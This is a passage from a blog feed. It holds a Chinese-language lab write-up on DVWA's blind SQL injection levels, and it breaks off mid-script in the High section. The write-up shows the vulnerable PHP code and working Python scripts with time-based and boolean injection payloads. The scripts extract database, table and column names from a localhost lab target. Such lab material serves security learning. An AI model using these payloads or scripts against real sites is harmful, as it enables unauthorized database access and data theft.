      <category term="dvwa-xss" scheme="https://Foxgrin.github.io/categories/dvwa-xss/"/>
    
    
      <category term="xss" scheme="https://Foxgrin.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-sql(blind)</title>
    <link href="https://Foxgrin.github.io//posts/55409/"/>
    <id>https://Foxgrin.github.io//posts/55409/</id>
    <published>2018-07-11T07:39:00.000Z</published>
    <updated>2018-07-11T10:36:59.664Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中的sql盲注关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;id&apos;]) &amp;&amp; isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">$id=$_POST[&apos;id&apos;];</span><br><span class="line">$sql=&quot;SELECT first_name , last_name FROM users WHERE user_id=&apos;$id&apos;&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br><span class="line">if($row)&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>所谓的盲注，就是既没有报错信息，查询结果也始终如一甚至没有查询结果，也就是我们不知道会得到什么结果</p><p>我们就不能像之前一样自由选择注入方法，没有报错信息，也就是说报错注入不能用</p><p>没有查询结果，也就是说联合注入不能用</p><p>剩下的也就是盲注</p><p>盲注又可以分为基于时间的盲注和布尔型的盲注</p><p>从源代码来看，这关没有报错信息，查询结果为空和不为空返回的信息是不同的，我们就可以利用返回信息来判断有无返回结果</p><p>我们先输入1，发现有返回结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql(blind)/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再输入1’，发现没有返回结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql(blind)/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入1’#，发现有返回结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql(blind)/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>说明id被单引号包裹，然后1是有查询结果的，然后我们就可以通用 1’ and 后面的语句进行盲注</p><p>and 后面的语句如果为真，则有返回结果，and 后面语句为假，则没有返回结果，我们可以在mysql命令行里先试着模拟注入语句</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql(blind)/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>把and后面的语句修改为注入的逻辑语句，这就是布尔型的盲注，举个例子，我们可以用布尔型盲注判断数据库名字的长度</p><p>输入1’ and length(database())=4#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql(blind)/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>而另一种基于时间的盲注，则是通过if(判断语句,1,sleep(5))来进行注入，如果判断语句为真，则不会sleep，为假则sleep 5秒</p><p>但是盲注的缺点就是一条一条试太麻烦了，这时候脚本的作用就体现出来了</p><p>我们先通过基于时间的盲注获取数据库名的长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length(database())=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        database_length=i</span><br><span class="line">        print(<span class="string">'The length of database is:'</span>,database_length)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这里r.elapsed.total_seconds()函数的作用是返回服务器接受请求到相应之间的时间，如果我们的判断语句length(database())=i 结果为真，则就不会sleep 5秒，t自然就小于5，就得到了数据库的长度</p><p>有了数据库名的长度，就可以获取数据库名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">            database=database+chr(j)</span><br><span class="line">            print(<span class="string">'The name of database is:'</span>,database)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>先获取数据库名长度的作用就是用来一位一位的截取数据库名的字符进行判断，如果等于一个ascii值则t&lt;5，这样一位一位的得到数据库名的字符</p><p>同样的方法获取数据表的长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">            database=database+chr(j)</span><br><span class="line">            print(<span class="string">'The name of database is:'</span>,database)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>获取数据表名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,1,sleep(3))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is:'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">3</span>):</span><br><span class="line">            table_name=table_name+chr(j)</span><br><span class="line">            print(<span class="string">'The name of table is:'</span>,table_name)</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                table_name=table_name+<span class="string">','</span></span><br></pre></td></tr></table></figure><p>获取users表下数据列总长度：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>,<span class="number">100</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and length((select group_concat(column_name) from information_schema.columns where table_name='users'))=%d#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">        column_length=i</span><br><span class="line">        print(column_length)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这里用了布尔型的盲注，由于数据列总长度可能较长，所以变量i的区间是通过反复尝试出来的</p><p>获取数据列名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">95</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1))=%d#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            column_name=column_name+chr(j)</span><br><span class="line">            print(<span class="string">"The name of column is:"</span>,column_name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                column_name=column_name+<span class="string">','</span></span><br></pre></td></tr></table></figure><p>总结：大部分sql注入都是得不到想要的结果，也没有报错信息的，所以大部分情况下我们都要进行盲注，而盲注就强烈推荐使用脚本，可以非常好的节约时间和精力</p><p>下面贴上本关完整的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://127.0.0.1/demo/sqli(blind)-low.php'</span></span><br><span class="line">database_length=<span class="number">0</span></span><br><span class="line">table_length=<span class="number">0</span></span><br><span class="line">column_length=<span class="number">0</span></span><br><span class="line">database=<span class="string">''</span></span><br><span class="line">table_name=<span class="string">''</span></span><br><span class="line">column_name=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库长度:4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length(database())=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        database_length=i</span><br><span class="line">        print(<span class="string">'The length of database is:'</span>,database_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库名:dvwa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">            database=database+chr(j)</span><br><span class="line">            print(<span class="string">'The name of database is:'</span>,database)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据表总长度:15</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>,<span class="number">16</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    print(t)</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        table_length=i</span><br><span class="line">        print(<span class="string">'The length of table is:'</span>,table_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据表名:guestbook,users</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,1,sleep(3))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is:'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">3</span>):</span><br><span class="line">            table_name=table_name+chr(j)</span><br><span class="line">            print(<span class="string">'The name of table is:'</span>,table_name)</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                table_name=table_name+<span class="string">','</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据列总长度:94</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>,<span class="number">100</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and length((select group_concat(column_name) from information_schema.columns where table_name='users'))=%d#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">        column_length=i</span><br><span class="line">        print(column_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据列名:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">95</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1))=%d#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            column_name=column_name+chr(j)</span><br><span class="line">            print(<span class="string">"The name of column is:"</span>,column_name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                column_name=column_name+<span class="string">','</span></span><br></pre></td></tr></table></figure><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">$id=$_POST[&apos;id&apos;];</span><br><span class="line">$id=mysql_real_escape_string($id);</span><br><span class="line">$sql=&quot;SELECT first_name,last_name FROM users where user_id=$id&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br><span class="line">if($row)&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>跟之前关卡区别只在于id未被引号包裹，稍微修改一下注入语句，跟之前关卡没什么区别，这里就不贴脚本了，参考上面的代码即可</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">include(&quot;sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if (isset($_SESSION[&apos;id&apos;]))&#123;</span><br><span class="line">$id=$_SESSION[&apos;id&apos;];</span><br><span class="line">$sql=&quot;SELECT first_name , last_name FROM users where user_id=&apos;$id&apos;&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br><span class="line">if($row)&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>有两个页面，一个页面用来接收post的id值并赋值给session的id值，主页面接受session的id值进行查询</p><p>这里的脚本需要特别注意一点，因为是两个页面，所以要把post的数据提交给input页面，然后再访问index主页面，这就需要利用到requests库的Session对象</p><p>以获取数据库名长度为例子说明：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length(database())=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    s.post(url_input,data=data)</span><br><span class="line">    r=s.get(url_index)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        database_length=i</span><br><span class="line">        print(<span class="string">'The length of database is:'</span>,database_length)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>先创建一个Session对象，利用该对象将数据post到input页面，然后再通过Session对象访问index页面</p><p>其他的改法类似，就不一一赘述了</p><p>下面贴上本关完整脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url_input=<span class="string">"http://127.0.0.1/demo/session-input.php"</span></span><br><span class="line">url_index=<span class="string">"http://127.0.0.1/demo/sqli(blind)-high.php"</span></span><br><span class="line"></span><br><span class="line">database_length=<span class="number">0</span></span><br><span class="line">table_length=<span class="number">0</span></span><br><span class="line">column_length=<span class="number">0</span></span><br><span class="line">database=<span class="string">''</span></span><br><span class="line">table_name=<span class="string">''</span></span><br><span class="line">column_name=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库长度:4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and 